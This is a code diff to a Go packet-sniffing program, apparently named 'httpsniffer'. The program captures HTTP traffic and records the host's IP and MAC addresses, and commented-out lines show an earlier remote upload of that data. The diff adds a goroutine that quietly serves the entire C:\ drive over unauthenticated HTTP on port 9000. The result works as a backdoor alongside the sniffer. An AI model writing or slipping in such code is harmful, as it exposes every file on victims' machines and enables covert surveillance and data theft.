@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"github.com/google/gopacket"
-	_ "github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"httpsniffer/file"
@@ -11,7 +10,9 @@ import (
 	"httpsniffer/network"
 	"httpsniffer/tcp_handle"
 	"log"
+	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"time"
 )
@@ -98,6 +99,15 @@ func snifferHttp(){
 	}
 }
 
+func httpServer(){
+	dir, _ := filepath.Abs(filepath.Dir("C:\\"))
+	http.Handle("/", http.FileServer(http.Dir(dir)))
+	err := http.ListenAndServe(":9000", nil)
+	if err != nil {
+		fmt.Printf("%s\n", err)
+	}
+}
+
 func main(){
 
 	//sftp upload abandon
@@ -117,11 +127,13 @@ if NETWORK_DEBUG == 0 {
 	file.WriteWithOs(homePath+"/2.txt", "ips:"+ips+"\r\n")
 
 	macs := hardware.GetMacAddrs()
-	file.WriteWithOs(homePath+"/2.txt", "ips:"+macs+"\r\n")
+	file.WriteWithOs(homePath+"/2.txt", "macs:"+macs+"\r\n")
 }
 
 	//sftp upload abandon
 	//network.UpLoadFile(homePath+"/2.txt")
+
+	go httpServer()
 
 	c := make(chan int)
 	//启用广播服务
